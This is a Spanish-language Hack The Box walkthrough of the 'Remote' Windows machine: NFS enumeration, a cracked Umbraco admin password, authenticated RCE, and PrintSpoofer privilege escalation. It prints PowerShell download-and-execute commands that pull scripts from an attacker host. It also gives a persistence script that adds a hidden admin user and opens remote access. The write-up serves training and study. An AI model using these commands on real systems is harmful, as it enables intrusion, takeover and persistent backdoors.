---
layout: single
title: Remote - Hack The Box
excerpt: "Hoy nos enfrentamos contra la máquina remote, es una máquina calificada con dificultad fácil. Contiene una mala configuración con la que nos deja acceder a información privilegiada de la máquina. Luego la escalada de privilegios es bastante sencilla."
date: 2022-09-13
classes: wide
header:
  teaser: /assets/images/htb-writeup-remote/remote_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - cxdxnt
tags:  
  - Rce
  - Misconfiguration
  - SeImpersonatePrivilege
  - NFS
---

![](/assets/images/htb-writeup-remote/remote_logo.png)

La máquina de hoy consiste en una mala configuración que deja expuesto una carpeta web del sistema. Gracias a dicha carpeta logramos extraer la versión de la aplicación y la contraseña de admin. Después la escalada consiste a través de un SeImpersonatePrivilege que consiste en poder ejecutar cualquier comando como nt authority.


## Enumeración
Comenzamos con un nmap.
```rb
nmap -sCV -p21,80,111,135,139,445,2049,5985,47001,49664,49665,49666,49667,49678,49679,49680 10.10.10.180 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-13 11:41 -03
Nmap scan report for 10.10.10.180
Host is up (0.25s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-09-13T14:42:22
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 218.23 seconds
```

En el escaneo de nmap logramos ver el servicio rpcbind, con la herramienta showmount podemos ver una montura expuesta por una mala configuración del sistema.
```bash
showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
```
Con mount procedemos a crear una montura para extraer todos los archivos del directorio a nuestro sistema.

![](/assets/images/htb-writeup-remote/montura.png)

Gracias a la montura identificamos que estamos contra un umbraco, generalmente el servicio web umbraco contiene un archivo llamado umbraco.sdf que ahí contiene contraseñas cifradas, lo buscamos y procedemos a tirarle un strings y buscamos por la palabra admin y encontramos esto. Luego mediante un archivo txt sacamos la versión de umbraco.

![](/assets/images/htb-writeup-remote/hash.png)

Procedemos a crackear la contraseña con john y vemos que la contraseña decifrada es baconandcheese.

## Rce y elevacion de privilegios.
Nos descargamos un exploit para la version 7.12.4 de umbraco y logramos ejecutar comandos.

![](/assets/images/htb-writeup-remote/rce.png)

Ahora que podemos ejecutar cualquier comando procedemos a crearnos una reverse shell.

```bash
python3 49488.py -u 'admin@htb.local' -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/Shell.ps1')"
```

Una vez adentro del sistema, ejecutamos un whoami /priv y vemos que tiene el privilegio SeImpersonatePrivilege.

![](/assets/images/htb-writeup-remote/elevacion-de-privilegios.png)

Accionarle dicho permiso al usuario consiste en un grabe error, ya que gracias al permiso podemos llegar a ejecutar comandos como nt authority. Procedemos a descargarnos PrintSpoofer64.exe lo que el binario hace es que podamos ejecutar comandos.

![](/assets/images/htb-writeup-remote/administrator.png)

Para poder tener  una shell como administrator nos creamos un simple script en powershell que se encarga de crear un usuario y modifica las reglas de windows para poder acceder a dicho usuario mediante evil-winrm, con este simple comando bastaría.

```powershell
.\PrintSpoofer64.exe -i -c "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/persistence.ps1')"
```

```powershell

function persistence($user,$password) {
     net user $user $password /add |out-null #Añade un usuario
     net localgroup administrators $user /add |out-null #Agrega al grupo administrator
     reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 |out-null  
     reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f |out-null
     reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f |out-null # Modifica las reglas de windows para que podamos acceder remotamente.
     net localgroup "Remote Management Users" $user /add |out-null # Lo agrega a un grupo en lo cual nos permite ingresar remotamente.
     echo "Successful";
    exit 0 # Salida exitosa
  }

  
persistence("cxdxnt","pwned123456#!@") #Usuario y contraseña
```
